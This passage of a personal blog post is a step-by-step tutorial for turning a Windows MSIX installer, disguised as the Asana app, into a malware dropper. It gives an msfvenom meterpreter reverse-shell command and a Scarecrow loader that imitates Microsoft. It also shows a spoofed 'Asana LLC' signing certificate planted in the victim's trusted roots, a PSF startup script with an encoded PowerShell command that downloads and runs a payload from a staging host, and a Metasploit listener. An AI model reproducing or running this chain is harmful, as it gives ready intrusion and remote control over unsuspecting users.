+<p><img src="https://github.com/user-attachments/assets/7dbce949-2533-4cad-a1a8-f8a3f749569d" alt="msix8"></p>
+<ul>
+<li>You will also need the target application being packaged. I used Asana for this example.</li>
+</ul>
+<h3 id="the-implant-being-staged">The implant being staged</h3>
+<ul>
+<li>We can quickly create a simple implant for the initial access. I will utilize an awesome repo called Scarecrow which I came across a while back that can create payloads that mimics reputable sources.</li>
+<li>We create our shellcode with msfvenom.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">msfvenom <span style="color:#f92672">-</span>p windows<span style="color:#f92672">/</span>x64<span style="color:#f92672">/</span>meterpreter<span style="color:#f92672">/</span>reverse_tcp LHOST<span style="color:#f92672">=</span><span style="color:#ae81ff">192.168.75.128</span> LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span> <span style="color:#f92672">-</span>f raw <span style="color:#f92672">&gt;</span> protection.bin
+</code></pre></div><ul>
+<li>Then generate the loader using Scarecrow.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">./scarecrow <span style="color:#f92672">-</span>I protection.bin <span style="color:#f92672">-</span>domain www.microsoft.com <span style="color:#f92672">-</span>encryptionmode AES
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/93b4e2a2-616e-4253-9362-acf0273d7910" alt="msix9"></p>
+<ul>
+<li>Host the final loader.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/488febe7-dc68-46c8-ac93-a63680a57d77" alt="msix10"></p>
+<h3 id="create-an-ssl-certificate">Create an SSL certificate</h3>
+<ul>
+<li>When running the MSIX file, Windows will check for the <code>digital signature</code> of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.</li>
+<li>Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own <code>self-signed certificate</code>, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors.</li>
+</ul>
+<ol>
+<li>Create a new self-signed certificate</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">New<span style="color:#f92672">-</span>SelfSignedCertificate <span style="color:#f92672">-</span>CertStoreLocation <span style="color:#e6db74">&#34;Cert:\CurrentUser\My&#34;</span> <span style="color:#f92672">-</span>TextExtension <span style="color:#f92672">@</span>(<span style="color:#e6db74">&#34;2.5.29.37={text}1.3.6.1.5.5.7.3.3&#34;</span>, <span style="color:#e6db74">&#34;2.5.29.19={text}&#34;</span>)<span style="color:#f92672">-</span>Type Custom <span style="color:#f92672">-</span>KeyUsage DigitalSignature <span style="color:#f92672">-</span>Subject <span style="color:#e6db74">&#34;Asana LLC&#34;</span> <span style="color:#f92672">-</span>FriendlyName <span style="color:#e6db74">&#34;Asana LLC&#34;</span>
+</code></pre></div><p>Subject must much the MSIX’s Publisher attribute value.</p>
+<ul>
+<li>You can find the thumbprint of the certificate like this.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">Set<span style="color:#f92672">-</span>Location Cert<span style="color:#f92672">:</span>\CurrentUser\My
+Get<span style="color:#f92672">-</span>ChildItem <span style="color:#f92672">|</span> Format<span style="color:#f92672">-</span>Table Subject, FriendlyName, Thumbprint
+</code></pre></div><ol start="2">
+<li>Export the private key which we will use to sign the MSIX</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s"><span style="color:#f92672">$</span>password <span style="color:#f92672">=</span> ConvertTo<span style="color:#f92672">-</span>SecureString <span style="color:#f92672">-</span>Force <span style="color:#f92672">-</span>AsPlainText <span style="color:#f92672">-</span>String pass123
+Export<span style="color:#f92672">-</span>PfxCertificate <span style="color:#f92672">-</span>Password <span style="color:#f92672">$</span>password <span style="color:#f92672">-</span>cert <span style="color:#e6db74">&#34;Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792&#34;</span> <span style="color:#f92672">-</span>FilePath  C<span style="color:#f92672">:</span>\Users\Saudi\cert.pfx
+</code></pre></div><ol start="3">
+<li>Export the public key which we will install in the victim’s computer</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">Export<span style="color:#f92672">-</span>Certificate <span style="color:#f92672">-</span>cert <span style="color:#e6db74">&#34;Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792&#34;</span> <span style="color:#f92672">-</span>FilePath <span style="color:#e6db74">&#39;C:\Users\Saudi\cert.cer&#39;</span>
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/1d359d10-934b-4d8f-9d80-80a17ba83122" alt="msix11"></p>
+<ul>
+<li>Since this is a self-signed SSL for testing purposes, you can install the security certificate on the victim as shown:</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/472506d4-908e-4b88-9f93-4c5387878582" alt="msix12"></p>
+<p><img src="https://github.com/user-attachments/assets/e9cb4135-88c0-4063-a104-8e01ac0be8f5" alt="msix13"></p>
+<ul>
+<li>Install the cert in the Trusted Root Certification Authorities.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/8e610224-54a8-4b56-b707-b2b8fe8ad764" alt="msix14"></p>
+<h3 id="bundle-the-package-and-stage-our-loader">Bundle the package and stage our loader</h3>
+<ul>
+<li>Select the task and follow through the prompts</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/5a1bda1e-473f-4166-9e42-71ed27a90b4a" alt="msix15"></p>
+<ul>
+<li>Select the Asana setup file as the installer being packaged and select the pfx certificate we generated.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/b4a80e28-213e-40e4-be4b-796179b1badd" alt="msix16"></p>
+<ul>
+<li>You can skip the Accelerator section. The package will automatically install in the system as shown.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/178734e3-2caa-4322-9a49-9370c3497f5c" alt="msix17"></p>
+<ul>
+<li>Ensure the package has an entry point as shown. We will edit the entry point in the manifest file later on to point to our psflauncher executable.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/ecad109a-9e98-4dc3-96ba-f9a006c081bf" alt="msix18"></p>
+<ul>
+<li>Here in the Create New Package Section, we go to the package editor to add the PSF binaries and config file to our package to give it PSF support.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/093ba4d5-8081-4653-ab18-8a956d5df20a" alt="msix19"></p>
+<ul>
+<li>In the package editor, click on package files, right-click on the “Package” and add the following appropriate files.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/ba54db86-765a-492f-9ead-2bc259dcd86d" alt="msix20"></p>
+<p><img src="https://github.com/user-attachments/assets/9482cf66-032b-4f62-b6fd-7fbdbf388c47" alt="msix21"></p>
+<ul>
+<li>You can edit files directly in the package editor by right-clicking and selecting edit. Let’s modify the config file to point to our staging script called Hotfix.ps1. In this example, I enabled the powershell window to debug any errors.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;applications&#34;</span>: [
+    {
+      <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;ASANA&#34;</span>,
+      <span style="color:#f92672">&#34;executable&#34;</span>: <span style="color:#e6db74">&#34;asana.exe&#34;</span>,
+      <span style="color:#f92672">&#34;scriptExecutionMode&#34;</span>: <span style="color:#e6db74">&#34;-ExecutionPolicy Unrestricted&#34;</span>,
+      <span style="color:#f92672">&#34;startScript&#34;</span>: {
+        <span style="color:#f92672">&#34;waitForScriptToFinish&#34;</span>: <span style="color:#66d9ef">true</span>,
+        <span style="color:#f92672">&#34;runOnce&#34;</span>: <span style="color:#66d9ef">false</span>,
+        <span style="color:#f92672">&#34;timeOut&#34;</span>: <span style="color:#ae81ff">30000</span>,
+        <span style="color:#f92672">&#34;showWindow&#34;</span>: <span style="color:#66d9ef">true</span>,
+        <span style="color:#f92672">&#34;scriptPath&#34;</span>: <span style="color:#e6db74">&#34;Hotfix.ps1&#34;</span>
+      }
+    }
+  ]
+}
+</code></pre></div><ul>
+<li>Create the <code>hotfix.ps1</code> file in a different window. We will add a powershell command that pulls our loader from the staging server and executes it.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/7f27e44c-9d03-47e8-9a63-7b9fb47e95fa" alt="msix22"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">powershell <span style="color:#f92672">-</span>enc <span style="color:#e6db74">&#34;dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADEAMgA4AC8AMgA0ADoAOQAwADAAMQAvAEgAbwB0AGYAaQB4AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADUAOwBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA=&#34;</span>
+</code></pre></div><ul>
+<li>Add the <code>hotfix.ps1</code> staging script.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/812e7559-2432-4c76-902e-15e6c7c75c69" alt="msix23"></p>
+<ul>
+<li>Back to the manifest file, let’s change the launch executable to our PSF binary so that the hotfix.ps1 can be executed post install.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/dfc715ea-23b0-489f-a08d-4c3f6046575f" alt="msix24"></p>
+<ul>
+<li>In this section, take note of the Application ID defined. We will also modify the executable value.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/ee9660d2-391c-4f20-9c91-41bc06b929ea" alt="msix25"></p>
+<ul>
+<li>Change it to point to the psf executable:</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/1d23ac8d-fe99-4308-9880-18486872435f" alt="msix26"></p>
+<ul>
+<li>Save and exit. Finally create your MSIX file.</li>
+</ul>
+<h2 id="testing-our-malicious-sample">Testing our malicious sample</h2>
+<blockquote>
+<p><strong>Alert</strong> <code>Ensure that the Asana application is not installed in the system</code></p>
+</blockquote>
+<p><img src="https://github.com/user-attachments/assets/a3c179c8-fb21-4dae-9b31-b35074c37be5" alt="msix27"></p>
+<ul>
+<li>Setup our listener.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">msfconsole <span style="color:#f92672">-</span>qx <span style="color:#e6db74">&#34;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.71;set LPORT 9001; set EXITFUNC thread; set EXITONSESSION false; exploit -j&#34;</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;&amp;</span><span style="color:#ae81ff">1</span>
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/6c698052-9a7c-4657-82c8-d9a55f9d8462" alt="msix28"></p>
+<ul>
+<li>Run the MSIX installation and catch your shell.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/80617c17-d3dd-4465-aafc-fb2a9e7b67dc" alt="msix29"></p>
+<ul>
+<li>Happy pentesting!</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+      <div>
+        <br>
+        <div>
+          <h5 class="title is-small">Share to social media</h5>
+          <div>
+            <a class="share share-network-twitter" style="background-color:#008080;"><i class="fab fah fa-lg fa-twitter"></i><span>Twitter</span></a>
+            <a class="share share-network-facebook" style="background-color:#1877f2;"><i class="fab fah fa-lg fa-facebook-f"></i><span>Facebook</span></a>
+            <a class="share share-network-linkedin" style="background-color:#2B1B17;"><i class="fab fah fa-lg fa-linkedin"></i><span>LinkedIn</span></a>
+            <a class="share share-network-hackernews" style="background-color:#008000"><i class="fab fah fa-lg fa-hacker-news"></i><span>HackerNews</span></a>
+            <a class="share share-network-pinterest" style="background-color:#bd081c;"><i class="fab fah fa-lg fa-pinterest"></i><span>Pinterest</span></a>
+            <a class="share share-network-pocket" style="background-color:#7F38EC;"><i class="fab fah fa-lg fa-get-pocket"></i><span>Pocket</span></a>
+            <a class="share share-network-email" style="background-color:#333333;"><i class="far fah fa-lg fa-envelope"></i><span>Email</span></a>
+            <a class="share share-network-flipboard" style="background-color: #837E7C;"><i class="fab fah fa-lg fa-flipboard"></i><span>Flipboard</span></a>
+            <a class="share share-network-quora" style="background-color:#808000;"><i class="fab fah fa-lg fa-quora"></i><span>Quora</span></a>
+            <a class="share share-network-reddit" style="background-color: #581845
+            ;"><i class="fab fah fa-lg fa-reddit-alien"></i><span>Reddit</span></a>
+            <a class="share share-network-telegram" style="background-color:#000080;"><i class="fab fah fa-lg fa-telegram-plane"></i><span>Telegram</span></a>
+            <a class="share share-network-whatsapp" style="background-color:#E55451;"><i class="fab fah fa-lg fa-whatsapp"></i><span>Whatsapp</span></a>
+            <a class="share share-network-sms" style="background-color:#513B1C;"><i class="far fah fa-lg fa-comment-dots"></i><span>SMS</span></a>
+          </div>
+        </div>
+      </div>
+      <div class="comments">
+        <div id="disqus_thread" pageConfig="[object Object]"></div>
+      </div>
+      
+      <div id="disqus_thread"></div>
+      <script>
+          
+
+          
+
+          (function() { 
+          var d = document, s = d.createElement('script');
+          s.src = 'https://engineer-dancun-personal-blog.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+          })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+      
+      <br><br><br>
+      <footer>
+        &copy;  
+        Powered by <a href="https://github.com/gohugoio/hugo" target="_blank">Hugo
+      </footer>
+      <script type="application/ld+json">
+        {
+          "@context" : "http://schema.org",
+          "@type" : "Blog",
+          "name": " Engineer Dancun ",
+          "url" : "https://devopsengineerdan.github.io",
+          "image": "./static/avatar.jpg",
+          "description": "Software Engineer and Researcher"
+        }
+        </script>
+        <script id="dsq-count-scr" src="//engineer-dancun.disqus.com/count.js" async></script>
+    </main>
+  </body>
+</html>
 
